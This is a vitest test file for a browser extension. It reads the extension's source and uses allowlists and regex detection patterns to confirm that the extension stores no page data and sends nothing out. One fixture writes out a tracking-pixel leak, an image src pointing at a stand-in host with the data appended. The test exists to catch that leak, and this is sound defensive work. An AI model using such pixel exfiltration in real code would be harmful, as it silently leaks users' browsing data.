import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import type { Rules } from './surface.js';
import { modulesIn, surfaceOf, why } from './surface.js';

const src = fileURLToPath(new URL('../src', import.meta.url));

/**
 * Every name this package uses and does not bind: the whole of what it can
 * reach outside itself.
 *
 * An allowlist rather than a list of names to refuse, and that is the point of
 * it. `fetch` is one way to send a page somewhere; `XMLHttpRequest`,
 * `WebSocket`, `EventSource`, `navigator.sendBeacon`, an `Image` whose `src`
 * is set, and `importScripts` are six more, and so is whatever the next
 * platform release calls the seventh. A list of the ones to refuse is a list
 * someone has to keep complete against a platform nobody here owns. This one
 * refuses everything not named, so a way out cannot arrive by being
 * forgotten. Adding a name is the deliberate act.
 *
 * Four names is the whole of the outside world this package sees. `chrome` is
 * the two extension calls `dormant.test.ts` allowlists. `document` is the page
 * the panel builds itself in. `Promise` is the return type of `executeScript`,
 * and `undefined` is what a tab without an id is compared against.
 */
const GLOBALS = new Set(['chrome', 'document', 'Promise', 'undefined']);

/**
 * Every property this package calls.
 *
 * The same allowlist, at the one place a global cannot be the route out.
 * `navigator.sendBeacon(url, data)` names no refused global — `navigator` is
 * as innocent as it gets — and `caches.open` or `chrome.storage.local.set`
 * would name none either if their objects were ever allowed.
 *
 * Eight names is the whole of what the extension does: find, build, attach,
 * append, remove, register, inject — and swallow the one rejection an
 * injection can produce, which is `catch` and is here because saying nothing
 * has to be said out loud. `background.ts` explains why.
 */
const CALLED = new Set([
  'addListener',
  'appendChild',
  'attachShadow',
  'catch',
  'createElement',
  'executeScript',
  'getElementById',
  'remove',
]);

/**
 * Every property this package writes to.
 *
 * The tightest of the three lists and the one that matters most, because
 * writing a property is how the panel would leak a page without ever calling
 * anything: `img.src = 'https://…/?' + location.href` is a request, made by
 * assignment, with no name any list of dangerous APIs would hold. Two names is
 * the whole panel: the host's id, and the words it says.
 */
const WRITTEN = new Set(['id', 'textContent']);

/**
 * Names refused by name as well as by absence from the allowlists above.
 *
 * Short on purpose. The allowlists above already refuse everything they do not
 * name, so a long catalogue of dangerous APIs would be guarding code that
 * cannot exist while four names is the whole outside world. What these rules
 * are for is the edit that widens an allowlist — a contributor who allowed one
 * name because the call in front of them seemed harmless — so each names the
 * route rather than every spelling of it, and the failing line says which list
 * stopped it.
 */
const LEAKS: Rules = [
  [/^(?:fetch|XMLHttpRequest|WebSocket|sendBeacon)$/, 'a way to make a request'],
  [/^(?:localStorage|sessionStorage|indexedDB|setItem)$/, 'a place to keep page data'],
  [/^(?:src|srcset|href|action|poster)$/, 'a request made by assignment'],
];

/** The one path off `chrome` that would keep something. */
const KEEPS: Rules = [[/^chrome\.storage\b/, 'the only place the extension could keep anything']];

/**
 * Every shape a destination takes as text.
 *
 * A name allowlist alone would miss the half of a request that is not an API:
 * a URL has to be written down somewhere, and a string is where. It is also
 * what covers the routes no reading of names can see at all — an `@import`, a
 * `url()` in a stylesheet — because both of them carry one of these, and the
 * panel ships a stylesheet.
 */
const DESTINATIONS: Rules = [
  [/\b[a-z][a-z0-9+.-]*:\/\//i, 'a URL'],
  [/^\/\//, 'a protocol-relative URL'],
  [/^(?:data|blob|javascript):/i, 'a URL that carries its own content'],
  [/@import|url\(/i, 'a stylesheet that loads something'],
];

/** One name, refused by either list or allowed by both. */
const refused = (kind: string, name: string, allowed: Set<string>, rules: Rules): string | null => {
  const reason = why(rules, name);
  if (reason !== undefined) return `${kind} ${name}, which is ${reason}`;
  return allowed.has(name) ? null : `${kind} ${name}`;
};

/**
 * Every way one module could store something or send it somewhere, one line
 * each. Empty is clean.
 */
function findings(text: string): string[] {
  const surface = surfaceOf(text);
  const found = [
    ...surface.refused,
    ...surface.globals.map((name) => refused('reaches', name, GLOBALS, LEAKS)),
    ...surface.called.map((name) => refused('calls', name, CALLED, LEAKS)),
    ...surface.written.map((name) => refused('writes', name, WRITTEN, LEAKS)),
    ...surface.chrome.map((path) => {
      const reason = why(KEEPS, path);
      return reason === undefined ? null : `names ${path}, which is ${reason}`;
    }),
    ...surface.strings.map((value) => {
      const reason = why(DESTINATIONS, value);
      return reason === undefined ? null : `writes a string naming ${reason}`;
    }),
  ];
  return [...new Set(found.filter((line): line is string => line !== null))];
}

/**
 * The design's privacy constraint, as a check rather than as a promise:
 *
 * > The project collects nothing. This is a constraint on the design, not a
 * > policy page.
 * >
 * > […] The extension holds `activeTab` only. It stores no page data and sends
 * > nothing anywhere.
 *
 * Neither half of that last sentence can be observed from a running extension.
 * An extension that stores nothing and one that stores everything look
 * identical from a page, and an extension that phones home looks identical to
 * one that does not until somebody thinks to watch the network on the right
 * page at the right moment. A reviewer reading `chrome://extensions` sees a
 * permission list, which is a claim about what is possible rather than about
 * what happens.
 *
 * So the source is read. `manifest.test.ts` holds the permission half, which
 * is what makes a remote host unreachable in the first place; this holds the
 * half that is about code, which matters because `activeTab` does not stop a
 * page's own origin from being a destination — an injected panel can `fetch`
 * anywhere the page can.
 *
 * There is no storage in this package for the same reason there is no cache in
 * it: the panel's only state is whether the panel is in the page, and the page
 * is the thing that knows that. `panel.test.ts` holds that as behaviour, and
 * names the one thing it costs.
 *
 * ## What still gets past
 *
 * - **A destination the code only has when it runs.** `'htt' + 'ps://…'`
 *   names nothing this reading can see. The allowlists are what narrow it: a
 *   string has to reach an API to become a request, and every API this package
 *   may name is written out above.
 * - **A property named at run time.** `el[field] = value` is refused rather
 *   than read, which is why `surfaceOf` reports it as a refusal.
 * - **A module reached at run time.** `boundary.test.ts` refuses a computed
 *   `import()` for the whole package, which is the backstop.
 */
describe('the extension, checked against storing or sending anything', () => {
  const modules = modulesIn(src);

  it('has sources to check, so nothing below passes for want of a file', () => {
    expect(Object.keys(modules).sort()).toEqual(['background.ts', 'chrome.d.ts', 'panel.ts']);
    // The check reads the modules it meant to read, rather than passing on
    // renamed files whose surface happens to be empty.
    expect(surfaceOf(modules['panel.ts'] ?? '').globals).toContain('document');
  });

  it('reaches four names outside itself, and no others', () => {
    const reached = new Set(Object.values(modules).flatMap((text) => surfaceOf(text).globals));

    expect([...reached].sort()).toEqual([...GLOBALS].sort());
  });

  it('calls eight properties, and no others', () => {
    const calls = new Set(Object.values(modules).flatMap((text) => surfaceOf(text).called));

    expect([...calls].sort()).toEqual([...CALLED].sort());
  });

  it('writes two properties, and no others', () => {
    const writes = new Set(Object.values(modules).flatMap((text) => surfaceOf(text).written));

    expect([...writes].sort()).toEqual([...WRITTEN].sort());
  });

  it('names no destination anywhere, in a string or otherwise', () => {
    const found = Object.entries(modules).flatMap(([name, text]) =>
      surfaceOf(text)
        .strings.filter((value) => why(DESTINATIONS, value) !== undefined)
        .map((value) => `${name} writes "${value}"`),
    );

    expect(found).toEqual([]);
  });

  it('stores no page data and sends none anywhere, by the whole reading', () => {
    const found = Object.entries(modules).flatMap(([name, text]) =>
      findings(text).map((line) => `${name} ${line}`),
    );

    expect(found).toEqual([]);
  });
});

describe('the privacy check, given an extension that keeps or sends something', () => {
  it('catches a leak made by assignment, which no list of dangerous calls holds', () => {
    // The case that earns its keep. Everything else a panel could do to send a
    // page somewhere goes through a name — `fetch`, `sendBeacon`, a socket —
    // and the four-name allowlist above refuses all of them by absence. This
    // one calls nothing: it builds an element the page never sees, writes a
    // URL into a property, and the browser makes the request on its behalf.
    // `WRITTEN` is the list that stops it, which is why that list is two names
    // long.
    expect(
      findings(
        [
          'export const send = (what: string) => {',
          '  const pixel = document.createElement("img");',
          '  pixel.src = "https://imgwhy.example/p?" + what;',
          '};',
        ].join('\n'),
      ),
    ).toEqual(['writes src, which is a request made by assignment', 'writes a string naming a URL']);
  });

  it('refuses a way out even where an allowlist has been loosened', () => {
    // What `LEAKS` is for, and the only way to show it: the shipped package
    // reaches none of it, so nothing about the checks above would change if it
    // were deleted. The edit it exists for is one to `GLOBALS` — a contributor
    // who allowed a name because the one call in front of them seemed
    // harmless — and this is the list that does not move with it.
    const loosened = new Set([...GLOBALS, 'fetch']);

    expect(refused('reaches', 'fetch', loosened, LEAKS)).toBe(
      'reaches fetch, which is a way to make a request',
    );
    expect(refused('reaches', 'document', loosened, LEAKS)).toBeNull();
  });
});
